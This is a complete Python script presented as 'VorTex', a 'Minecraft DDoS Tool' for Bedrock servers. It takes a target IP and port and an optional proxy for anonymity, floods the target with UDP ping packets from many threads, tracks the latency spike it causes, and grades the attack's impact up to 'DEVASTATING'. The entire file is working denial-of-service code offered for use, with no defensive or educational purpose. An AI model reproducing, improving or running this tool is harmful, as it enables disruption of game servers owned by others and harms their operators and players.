from mcstatus import BedrockServer
import socket
import threading
import time
import os
import pyfiglet
import socks

PING_PACKET = b'\x01' + b'\x00' * 17

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_server_latency(ip, port, attempts=3):
    latencies = []
    for i in range(attempts):
        try:
            server = BedrockServer.lookup(f"{ip}:{port}")
            status = server.status()
            latencies.append(status.latency)
            time.sleep(0.5)
        except:
            pass
    return sum(latencies) / len(latencies) if latencies else None

def monitor_latency_during_attack(ip, port, stop_time, results):
    max_latency = 0
    while time.time() < stop_time:
        try:
            server = BedrockServer.lookup(f"{ip}:{port}")
            status = server.status()
            latency = status.latency
            if latency:
                results['current_latency'] = latency
                if latency > max_latency:
                    max_latency = latency
                    results['max_latency'] = max_latency
            time.sleep(1)
        except:
            pass

def main():
    while True:
        clear_screen()
        print("\033[31m")
        print("""
Yb    dP  dP"Yb  88""Yb 888888 888888 Yb  dP 
 Yb  dP  dP   Yb 88__dP   88   88__    YbdP  
  YbdP   Yb   dP 88"Yb    88   88""    dPYb  
   YP     YbodP  88  Yb   88   888888 dP  Yb 
""")
        print("\033[0m")
        print("\033[31m        Minecraft DDoS Tool\033[0m")
        print("       ")
        print("       ")
        print("       ")
        print("\033[95mCreator: \033[0m S-K1DD13")
        print("Compatibility: Bedrock Edition")
        print("")
        
        ip = input("\033[96m🌐 Server IP: \033[0m")
        port = int(input("\033[93m🔌 Server port [default: 19132]: \033[0m") or 19132)
        
        print("\033[93m📡 Fetching server info...\033[0m")
        
        try:
            server = BedrockServer.lookup(f"{ip}:{port}")
            status = server.status()
            baseline_latency = get_server_latency(ip, port)
            
            print(f"✅ \033[92mServer Online!\033[0m")
            print(f"📡 Baseline Latency : {round(baseline_latency, 2)} ms")
            print(f"👥 Players : {status.players.online} / {status.players.max}")
            print(f"🎮 MOTD    : {status.motd.raw}")
            print(f"📝 Version : {status.version.name} (protocol {status.version.protocol})")
            print("")
            
        except:
            print("❌ \033[91mServer appeared to be offline. Try again later\033[0m")
            time.sleep(2)
            continue
        
        ddos_banner = pyfiglet.figlet_format("Proceed?", font="small")
        print(f"\033[93m{ddos_banner}\033[0m")
        print("\033[92m1 = Hell Yeah\033[0m")
        print("\033[91m0 = No, I feel bad\033[0m")
        print("")
        
        choice = input("Choice: ")
        
        if choice != "1":
            continue

        print("\n\033[94m🎭 Proxy Configuration (Optional)\033[0m")
        use_proxy = input("Use proxy? (y/n): ").lower()
        
        proxy_enabled = False
        if use_proxy == 'y':
            print("\n\033[93mProxy Types: socks5, socks4, http\033[0m")
            proxy_type = input("Proxy type [socks5]: ").lower() or "socks5"
            proxy_ip = input("Proxy IP: ")
            proxy_port = int(input("Proxy Port: "))
            
            try:
                if proxy_type == "socks5":
                    socks.set_default_proxy(socks.SOCKS5, proxy_ip, proxy_port)
                elif proxy_type == "socks4":
                    socks.set_default_proxy(socks.SOCKS4, proxy_ip, proxy_port)
                elif proxy_type == "http":
                    socks.set_default_proxy(socks.HTTP, proxy_ip, proxy_port)
                socket.socket = socks.socksocket
                proxy_enabled = True
                print("✅ \033[92mProxy configured\033[0m")
            except Exception as e:
                print(f"❌ \033[91mProxy failed: {e}\033[0m")
        
        threads = int(input("\033[92m🤖 Threads (bots): \033[0m"))
        duration = int(input("\033[91m⏱ Duration (seconds): \033[0m"))
        delay = float(input("\033[94m⚡ Delay between packets (e.g., 0.1 = fast): \033[0m"))

        stop_time = time.time() + duration
        packets_sent = 0
        packets_lock = threading.Lock()
        
        latency_results = {
            'baseline': baseline_latency,
            'max_latency': baseline_latency,
            'current_latency': baseline_latency,
        }

        print(f"\n\033[93m🎯 Target: {ip}:{port}\033[0m")
        print(f"\033[93m📊 Duration: {duration} seconds | Threads: {threads}\033[0m")
        print(f"📡 Baseline Latency: {baseline_latency:.2f} ms")
        
        print("\n\033[91m💥 STARTING ATTACK IN 3...\033[0m")
        time.sleep(1)
        print("\033[93m💥 STARTING ATTACK IN 2...\033[0m")
        time.sleep(1)
        print("\033[92m💥 STARTING ATTACK IN 1...\033[0m")
        time.sleep(1)
        print("\033[91m🚀 ATTACK LAUNCHED! Monitoring latency spikes...\033[0m\n")

        def send_ping():
            nonlocal packets_sent
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while time.time() < stop_time:
                try:
                    sock.sendto(PING_PACKET, (ip, port))
                    with packets_lock:
                        packets_sent += 1
                    time.sleep(delay)
                except Exception as e:
                    break
            sock.close()

        def monitor_progress():
            start_time = time.time()
            while time.time() < stop_time:
                elapsed = time.time() - start_time
                progress = min((elapsed / duration) * 100, 100)
                
                bar_length = 30
                filled_length = int(bar_length * progress / 100)
                bar = '█' * filled_length + '░' * (bar_length - filled_length)
                
                pps = packets_sent / elapsed if elapsed > 0 else 0
                current_latency = latency_results['current_latency']
                max_spike = latency_results['max_latency']
                
                latency_color = "\033[92m"
                if current_latency > baseline_latency * 2:
                    latency_color = "\033[93m"
                if current_latency > baseline_latency * 5:
                    latency_color = "\033[91m"
                
                print(f"\r\033[94mProgress: [{bar}] {progress:.1f}% | ⏱ {elapsed:.0f}s | 📦 {packets_sent} | ", end='')
                print(f"{latency_color}Latency: {current_latency:.0f}ms (Max: {max_spike:.0f}ms)\033[0m", end='', flush=True)
                time.sleep(0.5)
            
            elapsed = time.time() - start_time
            pps = packets_sent / elapsed if elapsed > 0 else 0
            bar = '█' * 30
            max_spike = latency_results['max_latency']
            print(f"\r\033[94mProgress: [{bar}] 100.0% | ⏱ {elapsed:.0f}s | 📦 {packets_sent} | \033[91mMax Latency: {max_spike:.0f}ms\033[0m")

        attack_threads = []
        for _ in range(threads):
            thread = threading.Thread(target=send_ping)
            thread.daemon = True
            thread.start()
            attack_threads.append(thread)

        latency_thread = threading.Thread(target=monitor_latency_during_attack, 
                                        args=(ip, port, stop_time, latency_results))
        latency_thread.daemon = True
        latency_thread.start()

        progress_thread = threading.Thread(target=monitor_progress)
        progress_thread.daemon = True
        progress_thread.start()

        progress_thread.join()

        print("\n📡 Measuring post-attack latency...")
        final_latency = get_server_latency(ip, port) or latency_results['current_latency']
        
        latency_increase = ((latency_results['max_latency'] - baseline_latency) / baseline_latency) * 100
        effectiveness = min(latency_increase / 10, 100)

        print(f"\n\033[92m✅ Attack completed!\033[0m")
        print(f"\033[94m📊 Final Stats: {packets_sent} total packets sent\033[0m")
        
        print("\n\033[95m📈 LATENCY IMPACT ANALYSIS:\033[0m")
        print(f"📡 Baseline Latency: {baseline_latency:.2f} ms")
        print(f"💥 Peak Latency: {latency_results['max_latency']:.2f} ms")
        print(f"📉 Final Latency: {final_latency:.2f} ms")
        print(f"🚀 Latency Increase: {latency_increase:.1f}%")
        
        if latency_increase > 500:
            rating = "💀 DEVASTATING"
            color = "\033[91m"
        elif latency_increase > 200:
            rating = "🔥 HIGH IMPACT"
            color = "\033[93m"
        elif latency_increase > 50:
            rating = "⚠️  MODERATE IMPACT"
            color = "\033[92m"
        else:
            rating = "💤 MINIMAL IMPACT"
            color = "\033[94m"
        
        print(f"{color}🎯 Attack Effectiveness: {rating} ({effectiveness:.1f}%)\033[0m")

        if proxy_enabled:
            socks.set_default_proxy()
            socket.socket = socket.socket

        print("\n\033[93m" + "="*50 + "\033[0m")
        print("\033[94m🔄 Operation Complete\033[0m")
        print("\033[93m" + "="*50 + "\033[0m")
        print("\033[92mPress ENTER to launch another attack\033[0m")
        print("\033[91mType 'exit' or 'quit' to close the tool\033[0m")
        
        continue_choice = input("\n\033[96mYour choice: \033[0m").lower().strip()
        
        if continue_choice in ['exit', 'quit', 'no', 'n']:
            print("\n\033[91m👋 Closing VorTex tool... Goodbye!\033[0m")
            break

if __name__ == "__main__":
    main()



